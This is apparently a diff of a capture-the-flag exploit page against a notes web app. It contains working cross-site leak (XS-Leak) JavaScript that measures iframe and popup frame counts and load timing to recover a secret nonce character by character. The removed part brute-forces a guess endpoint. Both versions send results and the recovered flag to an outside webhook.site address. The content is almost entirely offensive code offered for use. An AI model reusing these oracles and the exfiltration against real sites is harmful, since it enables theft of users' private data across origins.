@@ -5,257 +5,147 @@
 <script>
 var CHALL = 'https://notes.chall.lac.tf';
 var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
-var HEX = '0123456789abcdef';
 
 function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
 function log(m) { document.getElementById('log').textContent += m + '\n'; }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-// Load iframe and return load time + frame count
-function probe(url, size) {
+function testPopup(url, timeout) {
+  timeout = timeout || 4000;
   return new Promise(function(resolve) {
-    var f = document.createElement('iframe');
-    var s = size || 1;
-    f.style.cssText = 'width:'+s+'px;height:'+s+'px;position:absolute;left:-9999px';
     var start = performance.now();
-    var done = false;
-    function finish() {
-      if (done) return;
-      done = true;
-      var t = performance.now() - start;
-      var len = -1;
-      try { len = f.contentWindow.length; } catch(e) {}
-      resolve({ f: f, t: t, len: len });
+    var w;
+    try { w = window.open(url); } catch(e) {
+      resolve({ w: null, t: -1, len: -1, err: 'err:' + e.message }); return;
     }
-    f.onload = finish;
-    setTimeout(finish, 6000);
-    f.src = url;
-    document.body.appendChild(f);
+    if (!w) { resolve({ w: null, t: -1, len: -2, err: 'blocked' }); return; }
+    var iv = setInterval(function() {
+      var len = -1;
+      try { len = w.length; } catch(e) {}
+      if (len > 0 || performance.now() - start > timeout) {
+        clearInterval(iv);
+        resolve({ w: w, t: performance.now() - start, len: len });
+      }
+    }, 10);
   });
 }
 
-// ============ PHASE 1: Detect which oracle works ============
-async function detect() {
-  ping('v8_detect_start');
+function testIframe(url, delay) {
+  delay = delay || 3000;
+  return new Promise(function(resolve) {
+    var f = document.createElement('iframe');
+    f.style.cssText = 'width:400px;height:400px;position:absolute;left:-9999px';
+    var start = performance.now();
+    var done = false;
+    f.onload = function() {
+      var lt = performance.now() - start;
+      setTimeout(function() {
+        if (done) return; done = true;
+        var len = -1;
+        try { len = f.contentWindow.length; } catch(e) {}
+        resolve({ f: f, t: lt, len: len });
+      }, delay);
+    };
+    f.src = url;
+    document.body.appendChild(f);
+    setTimeout(function() {
+      if (done) return; done = true;
+      var len = -1;
+      try { len = f.contentWindow.length; } catch(e) {}
+      resolve({ f: f, t: 9999, len: len });
+    }, delay + 4000);
+  });
+}
 
-  // Test 1: loading=lazy with 1px iframe
-  // Match: empty search → shows all notes (1 note) → noteCount=1
-  // No-match: search=zzz → no results → noteCount=0
-  var lm = await probe(CHALL + '/?loading=x&referrerPolicy=lazy', 1);
-  var lnm = await probe(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 1);
-  ping('lazy1_m=' + lm.len + '_nm=' + lnm.len + '_mt=' + Math.round(lm.t) + '_nmt=' + Math.round(lnm.t));
-  lm.f.remove(); lnm.f.remove();
-  if (lm.len !== lnm.len && lm.len >= 0 && lnm.len >= 0) {
-    return { type: 'lazy', size: 1, mLen: lm.len, nmLen: lnm.len };
-  }
+async function run() {
+  ping('v10_start');
+  var mUrl = CHALL + '/?referrerPolicy=no-referrer';
+  var nmUrl = CHALL + '/?referrerPolicy=no-referrer&search=zzzzzzz';
 
-  // Test 2: loading=lazy with larger iframe
-  lm = await probe(CHALL + '/?loading=x&referrerPolicy=lazy', 100);
-  lnm = await probe(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 100);
-  ping('lazy100_m=' + lm.len + '_nm=' + lnm.len);
-  lm.f.remove(); lnm.f.remove();
-  if (lm.len !== lnm.len && lm.len >= 0 && lnm.len >= 0) {
-    return { type: 'lazy', size: 100, mLen: lm.len, nmLen: lnm.len };
-  }
+  // T1: iframe + 3s delay (storage partitioning check)
+  var t1m = await testIframe(mUrl, 3000);
+  ping('t1m=' + t1m.len + '_' + Math.round(t1m.t));
+  t1m.f.remove();
+  var t1nm = await testIframe(nmUrl, 3000);
+  ping('t1nm=' + t1nm.len + '_' + Math.round(t1nm.t));
+  t1nm.f.remove();
 
-  // Test 3: id=hash-ad-frame (display:none on ad iframes)
-  var hm = await probe(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 400);
-  var hnm = await probe(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 400);
-  ping('hidden_m=' + hm.len + '_nm=' + hnm.len + '_mt=' + Math.round(hm.t) + '_nmt=' + Math.round(hnm.t));
-  hm.f.remove(); hnm.f.remove();
-  if (hm.len !== hnm.len && hm.len >= 0 && hnm.len >= 0) {
-    return { type: 'hidden', mLen: hm.len, nmLen: hnm.len };
-  }
+  // T2: popup basic match vs nomatch
+  var t2m = await testPopup(mUrl);
+  ping('t2m=' + t2m.len + '_' + Math.round(t2m.t) + (t2m.err ? '_' + t2m.err : ''));
+  if (t2m.w) t2m.w.close(); await sleep(200);
+  var t2nm = await testPopup(nmUrl);
+  ping('t2nm=' + t2nm.len + '_' + Math.round(t2nm.t) + (t2nm.err ? '_' + t2nm.err : ''));
+  if (t2nm.w) t2nm.w.close(); await sleep(200);
 
-  // Test 4: Normal (sanity check timing)
-  var nm = await probe(CHALL + '/?referrerPolicy=no-referrer', 400);
-  var nnm = await probe(CHALL + '/?referrerPolicy=no-referrer&search=zzzzzzz', 400);
-  ping('norm_m=' + nm.len + '_t=' + Math.round(nm.t) + '_nm=' + nnm.len + '_t=' + Math.round(nnm.t));
-  nm.f.remove(); nnm.f.remove();
+  // T3: popup + loading=lazy on ads
+  var t3m = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy');
+  ping('t3m=' + t3m.len + '_' + Math.round(t3m.t));
+  if (t3m.w) t3m.w.close(); await sleep(200);
+  var t3nm = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz');
+  ping('t3nm=' + t3nm.len + '_' + Math.round(t3nm.t));
+  if (t3nm.w) t3nm.w.close(); await sleep(200);
 
-  // Test 5: Repeat timing test for signal estimation
-  var matchTimes = [];
-  var nomatchTimes = [];
+  // T4: popup + id=hash-ad-frame (ads hidden via CSS)
+  var t4m = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame');
+  ping('t4m=' + t4m.len + '_' + Math.round(t4m.t));
+  if (t4m.w) t4m.w.close(); await sleep(200);
+  var t4nm = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz');
+  ping('t4nm=' + t4nm.len + '_' + Math.round(t4nm.t));
+  if (t4nm.w) t4nm.w.close(); await sleep(200);
+
+  // T5: popup + srcdoc override (eliminates ad network requests)
+  var t5m = await testPopup(CHALL + '/?srcdoc=x&referrerPolicy=x');
+  ping('t5m=' + t5m.len + '_' + Math.round(t5m.t));
+  if (t5m.w) t5m.w.close(); await sleep(200);
+  var t5nm = await testPopup(CHALL + '/?srcdoc=x&referrerPolicy=x&search=zzzzzzz');
+  ping('t5nm=' + t5nm.len + '_' + Math.round(t5nm.t));
+  if (t5nm.w) t5nm.w.close(); await sleep(200);
+
+  // T6: popup timing x5 alternating match/nomatch
+  var mt = [], nmt = [], ml = [], nml = [];
   for (var i = 0; i < 5; i++) {
-    var mt = await probe(CHALL + '/?referrerPolicy=no-referrer', 1);
-    var nmt = await probe(CHALL + '/?referrerPolicy=no-referrer&search=zzzzzzz', 1);
-    matchTimes.push(Math.round(mt.t));
-    nomatchTimes.push(Math.round(nmt.t));
-    mt.f.remove(); nmt.f.remove();
+    var a = await testPopup(mUrl);
+    mt.push(Math.round(a.t)); ml.push(a.len);
+    if (a.w) a.w.close(); await sleep(100);
+    var b = await testPopup(nmUrl);
+    nmt.push(Math.round(b.t)); nml.push(b.len);
+    if (b.w) b.w.close(); await sleep(100);
   }
-  ping('timing_match=' + matchTimes.join(',') + '_nomatch=' + nomatchTimes.join(','));
+  ping('t6mt=' + mt.join(',') + '_nmt=' + nmt.join(','));
+  ping('t6ml=' + ml.join(',') + '_nml=' + nml.join(','));
 
-  return { type: 'timing' };
+  // T7: popup + lazy timing x3
+  var lmt = [], lnmt = [], lml = [], lnml = [];
+  for (var i = 0; i < 3; i++) {
+    var c = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy');
+    lmt.push(Math.round(c.t)); lml.push(c.len);
+    if (c.w) c.w.close(); await sleep(100);
+    var d = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz');
+    lnmt.push(Math.round(d.t)); lnml.push(d.len);
+    if (d.w) d.w.close(); await sleep(100);
+  }
+  ping('t7lmt=' + lmt.join(',') + '_lnmt=' + lnmt.join(','));
+  ping('t7lml=' + lml.join(',') + '_lnml=' + lnml.join(','));
+
+  // T8: popup + hidden(id) timing x3
+  var hmt = [], hnmt = [], hml = [], hnml = [];
+  for (var i = 0; i < 3; i++) {
+    var e = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame');
+    hmt.push(Math.round(e.t)); hml.push(e.len);
+    if (e.w) e.w.close(); await sleep(100);
+    var g = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz');
+    hnmt.push(Math.round(g.t)); hnml.push(g.len);
+    if (g.w) g.w.close(); await sleep(100);
+  }
+  ping('t8hmt=' + hmt.join(',') + '_hnmt=' + hnmt.join(','));
+  ping('t8hml=' + hml.join(',') + '_hnml=' + hnml.join(','));
+
+  ping('v10_done');
+  log('Done!');
 }
 
-// ============ PHASE 2a: Frame count oracle ============
-async function leakFrameCount(oracle) {
-  var nonce = '';
-  for (var pos = 0; pos < 8; pos++) {
-    var found = null;
-    for (var round = 0; round < 3 && found === null; round++) {
-      var promises = [];
-      var results = {};
-      for (var i = 0; i < 16; i++) {
-        (function(c) {
-          var url;
-          if (oracle.type === 'lazy') {
-            url = CHALL + '/?loading=x&referrerPolicy=lazy&search=' + encodeURIComponent(nonce + c);
-          } else {
-            url = CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=' + encodeURIComponent(nonce + c);
-          }
-          promises.push(probe(url, oracle.size || 1).then(function(r) {
-            results[c] = r.len;
-            r.frame && r.frame.remove();
-            r.f && r.f.remove();
-          }));
-        })(HEX[i]);
-      }
-      await Promise.all(promises);
-
-      var info = '';
-      for (var i = 0; i < 16; i++) {
-        var c = HEX[i];
-        info += c + ':' + results[c] + ' ';
-        if (results[c] > oracle.nmLen) {
-          found = c;
-        }
-      }
-      ping('p' + pos + 'r' + round + '_' + info.trim());
-    }
-
-    if (found) {
-      nonce += found;
-    } else {
-      // Pick char with highest frame count
-      var best = '0', bestL = -1;
-      for (var i = 0; i < 16; i++) {
-        if ((results[HEX[i]] || 0) > bestL) { bestL = results[HEX[i]]; best = HEX[i]; }
-      }
-      nonce += best;
-    }
-    log('pos' + pos + '=' + nonce[pos] + ' nonce=' + nonce);
-    ping('pos' + pos + '=' + nonce[pos]);
-  }
-  return [nonce];
-}
-
-// ============ PHASE 2b: Timing oracle ============
-async function leakTiming() {
-  var allTop = [];
-  var prefix = '';
-
-  for (var pos = 0; pos < 8; pos++) {
-    var timings = {};
-    for (var i = 0; i < 16; i++) timings[HEX[i]] = [];
-
-    for (var round = 0; round < 2; round++) {
-      var promises = [];
-      for (var i = 0; i < 16; i++) {
-        (function(c) {
-          var url = CHALL + '/?referrerPolicy=no-referrer&search=' + encodeURIComponent(prefix + c);
-          promises.push(probe(url, 1).then(function(r) {
-            timings[c].push(r.t);
-            r.f.remove();
-          }));
-        })(HEX[i]);
-      }
-      await Promise.all(promises);
-      await sleep(100);
-    }
-
-    // Rank by minimum time (fastest = likely match)
-    var ranked = [];
-    var info = '';
-    for (var i = 0; i < 16; i++) {
-      var c = HEX[i];
-      var mn = Math.min.apply(null, timings[c]);
-      ranked.push({ c: c, t: mn });
-      info += c + ':' + Math.round(mn) + ' ';
-    }
-    ranked.sort(function(a, b) { return a.t - b.t; });
-
-    var top3 = [];
-    for (var i = 0; i < 3 && i < ranked.length; i++) top3.push(ranked[i].c);
-    allTop.push(top3);
-    prefix += top3[0];
-
-    ping('p' + pos + '_' + info.trim());
-    log('pos' + pos + ' top=' + top3.join(','));
-  }
-
-  // Generate all combinations from top-3 per position
-  var combos = [''];
-  for (var p = 0; p < allTop.length; p++) {
-    var nc = [];
-    for (var i = 0; i < combos.length; i++) {
-      for (var j = 0; j < allTop[p].length; j++) {
-        nc.push(combos[i] + allTop[p][j]);
-      }
-    }
-    combos = nc;
-  }
-  return combos;
-}
-
-// ============ PHASE 3: Brute force /guess ============
-async function tryGuess(nonces) {
-  ping('guessing_n=' + nonces.length);
-  log('Trying ' + nonces.length + ' nonce(s)...');
-
-  for (var i = 0; i < nonces.length; i += 30) {
-    var batch = nonces.slice(i, i + 30);
-    var results = await Promise.all(batch.map(function(n) {
-      return fetch(CHALL + '/guess?nonce=' + n)
-        .then(function(r) { return r.text(); })
-        .then(function(t) { return { n: n, t: t }; })
-        .catch(function() { return { n: n, t: 'err' }; });
-    }));
-
-    for (var j = 0; j < results.length; j++) {
-      if (results[j].t !== 'Incorrect' && results[j].t !== 'err') {
-        ping('FLAG=' + results[j].t + '&nonce=' + results[j].n);
-        log('FLAG: ' + results[j].t);
-        return results[j].t;
-      }
-    }
-  }
-  return null;
-}
-
-// ============ MAIN ============
-async function main() {
-  ping('v8_main_start');
-
-  // Phase 1: Detect oracle
-  var oracle = await detect();
-  ping('oracle=' + oracle.type);
-  log('Oracle: ' + oracle.type);
-
-  var nonces;
-  if (oracle.type === 'lazy' || oracle.type === 'hidden') {
-    nonces = await leakFrameCount(oracle);
-  } else {
-    nonces = await leakTiming();
-  }
-
-  ping('candidates=' + nonces.length);
-
-  // Phase 3: Try guesses
-  var flag = await tryGuess(nonces);
-
-  if (flag) {
-    log('SUCCESS: ' + flag);
-    // Send flag multiple ways
-    new Image().src = WH + '?FLAG=' + encodeURIComponent(flag);
-    fetch(WH + '?FLAG2=' + encodeURIComponent(flag)).catch(function(){});
-  } else {
-    ping('all_failed');
-    log('All attempts failed');
-  }
-}
-
-main();
+run();
 </script>
 </body>
 </html>
